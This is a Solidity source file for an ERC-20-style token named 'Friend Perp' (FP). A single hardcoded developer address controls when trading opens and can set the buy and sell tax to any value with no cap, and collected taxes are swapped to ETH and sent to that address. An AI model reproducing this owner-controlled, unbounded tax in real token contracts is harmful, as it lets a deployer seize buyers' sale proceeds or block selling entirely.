/*
  https://discord.gg/4q9fahZ2
  https://friendperps-organization.gitbook.io/friendperp/
  https://twitter.com/friendperp
*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTaxFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract FP {
        

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed DEVMS,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

        string public   name_ = unicode"Friend Perp"; 
        string public   symbol_ = unicode"FP";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100000000 * 10**decimals;

        uint256 buyTaxFee = 0;
        uint256 sellTaxFee = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant DEVMS = payable(address(0x4FA849d47c8669288827686210666444F7DbAeC7));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DEVMS || to == DEVMS);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTaxFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                DEVMS.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TaxFeeAmount = amount * (from == pair ? buyTaxFee : sellTaxFee) / 100;
                amount -= TaxFeeAmount;
                balanceOf[address(this)] += TaxFeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == DEVMS);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setTaxFee(uint256 _buy, uint256 _sell) private {
            buyTaxFee = _buy;
            sellTaxFee = _sell;
        }

        function setTaxFee(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DEVMS)        
                revert Permissions();
            _setTaxFee(_buy, _sell);
        }
    }